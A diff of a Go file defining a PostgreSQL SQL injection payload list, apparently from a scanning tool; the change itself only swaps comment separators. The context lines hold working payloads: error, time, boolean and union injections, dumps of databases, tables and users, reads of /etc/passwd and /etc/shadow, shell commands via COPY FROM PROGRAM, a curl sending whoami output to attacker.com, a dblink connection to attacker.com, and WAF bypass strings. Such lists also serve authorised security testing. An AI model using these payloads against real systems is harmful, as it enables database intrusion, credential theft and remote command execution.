@@ -3,9 +3,9 @@ package payloads
 var PostgreSQL = PayloadGroup{
 	DBMS: "PostgreSQL",
 	Payloads: []Payload{
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ERROR-BASED (CAST, Division by Zero)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "error", Content: "1' || (SELECT 'a' FROM pg_sleep(5)) || '1"},
 		{Type: "error", Content: "'; SELECT CAST('a' AS NUMERIC)--"},
 		{Type: "error", Content: "'; SELECT 1/0--"},
@@ -21,9 +21,9 @@ var PostgreSQL = PayloadGroup{
 		{Type: "error", Content: "'; SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user),FLOOR(RANDOM()*1000)) x FROM pg_class GROUP BY x) a--"},
 		{Type: "error", Content: "'; SELECT CAST((SELECT user) AS NUMERIC)--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// TIME-BASED (pg_sleep)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "time", Content: "'; SELECT pg_sleep(5)--"},
 		{Type: "time", Content: "' AND (SELECT 2144 FROM pg_sleep(5))--"},
 		{Type: "time", Content: "' AND (SELECT 1 FROM pg_sleep(5))--"},
@@ -40,9 +40,9 @@ var PostgreSQL = PayloadGroup{
 		{Type: "time", Content: "' OR (SELECT pg_sleep(5))--"},
 		{Type: "time", Content: "') OR pg_sleep(5)--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// BOOLEAN-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
 		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
 		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
@@ -55,9 +55,9 @@ var PostgreSQL = PayloadGroup{
 		{Type: "boolean", Content: "' OR 'a'='a'--", Expected: "true"},
 		{Type: "boolean", Content: "' OR 'a'='b'--", Expected: "false"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// UNION-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "union", Content: "' ORDER BY 1--"},
 		{Type: "union", Content: "' ORDER BY 2--"},
 		{Type: "union", Content: "' ORDER BY 3--"},
@@ -73,9 +73,9 @@ var PostgreSQL = PayloadGroup{
 		{Type: "union", Content: "' UNION SELECT CURRENT_DATABASE(),2,3--"},
 		{Type: "union", Content: "' UNION SELECT string_agg(datname,','),2,3 FROM pg_database--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// DATA EXTRACTION
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "deep", Content: "' UNION SELECT string_agg(datname,','),NULL,NULL FROM pg_database--"},
 		{Type: "deep", Content: "' UNION SELECT string_agg(tablename,','),NULL,NULL FROM pg_catalog.pg_tables WHERE schemaname='public'--"},
 		{Type: "deep", Content: "' UNION SELECT string_agg(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--"},
@@ -85,9 +85,9 @@ var PostgreSQL = PayloadGroup{
 		{Type: "deep", Content: "' UNION SELECT usename,NULL FROM pg_catalog.pg_user--"},
 		{Type: "deep", Content: "' UNION SELECT current_database(),NULL--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// POST-EXPLOITATION (File Read/Write)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "deep", Content: "' UNION SELECT pg_read_file('/etc/passwd',0,1000),NULL,NULL--"},
 		{Type: "deep", Content: "' UNION SELECT pg_read_file('/etc/hostname',0,1000),NULL,NULL--"},
 		{Type: "deep", Content: "' UNION SELECT pg_read_file('/proc/self/status',0,1000),NULL,NULL--"},
@@ -97,9 +97,9 @@ var PostgreSQL = PayloadGroup{
 		{Type: "deep", Content: "'; CREATE TABLE passwd_out(content text); COPY passwd_out FROM '/etc/passwd'; SELECT content FROM passwd_out;--"},
 		{Type: "deep", Content: "'; COPY (SELECT current_database()) TO '/tmp/db.txt';--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// POST-EXPLOITATION (Command Execution via COPY PROGRAM)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out;--"},
 		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'uname -a'; SELECT * FROM cmd_out;--"},
 		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM cmd_out;--"},
@@ -112,26 +112,26 @@ var PostgreSQL = PayloadGroup{
 		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'curl http://attacker.com/$(whoami)';--"},
 		{Type: "deep", Content: "'; DROP TABLE IF EXISTS cmd_out;--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// POST-EXPLOITATION (UDF + Extension Load)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "deep", Content: "'; CREATE EXTENSION IF NOT EXISTS dblink;--"},
 		{Type: "deep", Content: "'; SELECT dblink_connect('host=attacker.com dbname=template1');--"},
 		{Type: "deep", Content: "'; SELECT lo_import('/etc/passwd');--"},
 		{Type: "deep", Content: "'; SELECT lo_from_bytearray(12345, (SELECT encode(pg_read_binary_file('/etc/shadow'),'hex')));--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// STACKED QUERIES
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "stacked", Content: "'; SELECT 1; SELECT 2;--"},
 		{Type: "stacked", Content: "'; CREATE TABLE test(id INT);--"},
 		{Type: "stacked", Content: "'; INSERT INTO test VALUES (1);--"},
 		{Type: "stacked", Content: "'; DROP TABLE IF EXISTS test;--"},
 		{Type: "stacked", Content: "'; CREATE OR REPLACE FUNCTION bypass() RETURNS void AS $$ BEGIN PERFORM pg_sleep(5); END; $$ LANGUAGE plpgsql; SELECT bypass();--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ADVANCED TIME-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM generate_series(1,10000000) a, generate_series(1,100) b)--"},
 		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT 1)a, (SELECT 1)b, (SELECT 1)c, (SELECT 1)d, (SELECT 1)e, (SELECT 1)f, (SELECT 1)g)--"},
 		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM pg_class a, pg_class b, pg_class c) x)--"},
@@ -146,7 +146,7 @@ var PostgreSQL = PayloadGroup{
 		{Type: "time", Content: "1\" OR pg_sleep(5)--"},
 
 		// ADVANCED BOOLEAN
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "1' AND 1=1 AND '1'='1", Expected: "true"},
 		{Type: "boolean", Content: "1' AND 1=2 AND '1'='1", Expected: "false"},
 		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
@@ -163,12 +163,12 @@ var PostgreSQL = PayloadGroup{
 		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
 
 		// ADVANCED ERROR-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT user),':',FLOOR(RAND()*2))x FROM pg_class GROUP BY x) a)--"},
 		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM pg_class GROUP BY CONCAT((SELECT user),FLOOR(RAND()*2))) a)--"},
 
 		// WAF BYPASS
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
 		{Type: "bypass", Content: "'%20OR%201=1--"},
 		{Type: "bypass", Content: "'%09OR%091=1--"},
